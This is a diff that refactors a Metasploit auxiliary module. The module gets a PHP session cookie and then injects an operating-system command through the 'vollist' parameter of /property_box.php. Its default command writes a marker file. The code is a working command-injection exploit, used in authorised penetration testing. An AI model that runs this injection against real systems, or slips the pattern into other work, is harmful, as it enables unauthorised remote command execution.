@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -36,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(443),
         OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
         OptBool.new('SSL',   [true, 'Use SSL', true]),
-      ], self.class)
+      ])
   end
 
   def run
@@ -49,9 +46,7 @@ class Metasploit3 < Msf::Auxiliary
         'method' => 'POST',
       }, 5)
 
-      if (res and res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/PHPSESSID=(.*);(.*)/i))
-
-        sessionid = res.headers['Set-Cookie'].split(';')[0]
+      if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)
 
           print_status("Sending command: #{datastore['CMD']}...")
 
@@ -59,7 +54,7 @@ class Metasploit3 < Msf::Auxiliary
             {
               'uri'	=> '/property_box.php',
               'data'  => 'type=Sections&vollist=75' + Rex::Text.uri_encode("&" + cmd),
-              'cookie' => sessionid,
+              'cookie' => res.get_cookies,
               'method' => 'POST',
             }, 5)
 
